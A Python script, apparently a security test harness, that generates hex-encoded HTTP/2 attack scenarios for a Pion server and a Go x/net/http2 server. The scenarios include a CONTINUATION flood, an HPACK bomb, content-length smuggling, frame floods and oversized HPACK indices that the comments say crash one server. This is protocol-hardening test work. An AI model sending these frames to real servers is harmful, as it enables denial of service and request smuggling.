#!/usr/bin/env python3
"""Connection-level attack scenarios (client -> server), shared by Pion (`probe conn`) and the Go
x/net/http2 Server harness (conn/go). Line format: `<name>\t<chunk hex>[,<chunk hex>...]`.
Bytes are what the client sends AFTER the preface + its (empty) SETTINGS frame. The Go harness writes
chunks 20 ms apart (so per-stream exchanges really are sequential); Pion gets all chunks concatenated.
Both servers run with MaxConcurrentStreams = 4.
"""
import struct
import sys


def fr(t, flags, sid, payload):
    return struct.pack(">I", len(payload))[1:] + bytes([t, flags]) + struct.pack(">I", sid) + payload


def lit(n: bytes, v: bytes) -> bytes:  # literal without indexing, new name, raw strings (< 127 bytes)
    assert len(n) < 127 and len(v) < 127
    return b"\x00" + bytes([len(n)]) + n + bytes([len(v)]) + v


def enc_int(v, prefix, mask):
    m = (1 << prefix) - 1
    if v < m:
        return bytes([mask | v])
    out = [mask | m]
    v -= m
    while v >= 128:
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    out.append(v)
    return bytes(out)


def req(path=b"/", method=b"POST", extra=(), scheme=True, pseudo_extra=()):
    b = lit(b":method", method)
    for n, v in pseudo_extra:
        b += lit(n, v)
    if scheme:
        b += lit(b":scheme", b"https")
    b += lit(b":authority", b"a.example") + lit(b":path", path)
    for n, v in extra:
        b += lit(n, v)
    return b


def headers(sid, block, es=False, eh=True):
    return fr(1, (4 if eh else 0) | (1 if es else 0), sid, block)


def data(sid, payload, es=False):
    return fr(0, 1 if es else 0, sid, payload)


def main():
    S = []
    add = lambda name, *chunks: S.append((name, list(chunks)))
    add("even_client_stream_id", headers(2, req(method=b"GET"), es=True))
    add("decreasing_stream_id", headers(5, req(method=b"GET"), es=True) + headers(3, req(method=b"GET"), es=True))
    add("max_concurrent_6_of_4", b"".join(headers(s, req()) for s in [1, 3, 5, 7, 9, 11]))
    add("second_request_headers_same_stream", headers(1, req(b"/public")) + headers(1, req(b"/admin")))
    add("push_promise_to_server", headers(1, req()) + fr(5, 4, 1, struct.pack(">I", 2) + req(b"/p", b"GET")))
    add("content_length_mismatch", headers(1, req(extra=[(b"content-length", b"5")])) + data(1, b"hello, smuggled request", es=True))
    add("conflicting_content_length", headers(1, req(extra=[(b"content-length", b"5"), (b"content-length", b"50")])) + data(1, b"hello", es=True))
    add("path_not_origin_form", headers(1, req(path=b"http://evil.example/x", method=b"GET"), es=True))
    add("path_relative", headers(1, req(path=b"foo", method=b"GET"), es=True))
    add("path_asterisk_get", headers(1, req(path=b"*", method=b"GET"), es=True))
    add("ctl_byte_in_value", headers(1, req(method=b"GET", extra=[(b"x-ctl", b"a\x01b")]), es=True))
    add("del_byte_in_value", headers(1, req(method=b"GET", extra=[(b"x-del", b"a\x7fb")]), es=True))
    add("leading_space_value", headers(1, req(method=b"GET", extra=[(b"x-ws", b" lead")]), es=True))
    add("protocol_on_get", headers(1, req(method=b"GET", pseudo_extra=[(b":protocol", b"websocket")]), es=True))
    add("malformed_stream3_keeps_stream1",
        headers(1, req(b"/healthy")) + headers(3, lit(b":method", b"GET") + lit(b":path", b"/x"), es=True) + data(1, b"body", es=True))
    add("padding_only_data_76800B", headers(1, req()) + b"".join(fr(0, 8, 1, b"\xff" + b"\0" * 255) for _ in range(300)))
    # 150 sequential request+cancel exchanges (concurrency 1), 20 ms apart on the Go side
    add("sequential_cancel_x150", *[headers(s, req()) + fr(3, 0, s, b"\0\0\0\x08") for s in range(1, 301, 2)])
    add("settings_enable_connect_protocol_2", fr(4, 0, 0, struct.pack(">HI", 8, 2)))
    add("settings_unknown_id_ignored", fr(4, 0, 0, struct.pack(">HI", 0xFFFF, 1) + struct.pack(">HI", 0x7F, 9)))
    # controls
    add("ctl_continuation_flood_zero_len", headers(1, b"", eh=False) + b"".join(fr(9, 0, 1, b"") for _ in range(10000)))
    bomb_entry = b"\x40\x01x" + enc_int(4000, 7, 0) + b"a" * 4000
    add("ctl_hpack_bomb_4k_x10000", fr(1, 4, 1, req(method=b"GET") + bomb_entry + b"\xbe" * 10000))
    add("ctl_data_on_idle_stream", data(1, b"x"))
    add("ctl_ping_inside_header_block", headers(1, req(), eh=False) + fr(6, 0, 0, b"\0" * 8))
    add("ctl_conn_window_overflow", fr(8, 0, 0, struct.pack(">I", 0x7FFFFFFF)))
    add("ctl_oversize_frame", data(1, b"\0" * 16385))
    # P0 / P1 HPACK (last: they abort the Pion probe, which is restarted on the next line)
    add("hpack_index_2pow32_plus2_alias", fr(1, 5, 1, enc_int(2**32 + 2, 7, 0x80) + req(method=b"GET")[len(lit(b":method", b"GET")):]))
    add("hpack_index_2pow32_minus1_abort", fr(1, 5, 1, enc_int(2**32 - 1, 7, 0x80)))
    with open(sys.argv[1], "w") as f:
        for n, chunks in S:
            f.write(n + "\t" + ",".join(c.hex() for c in chunks) + "\n")
    print(f"{len(S)} scenarios -> {sys.argv[1]}")


if __name__ == "__main__":
    main()
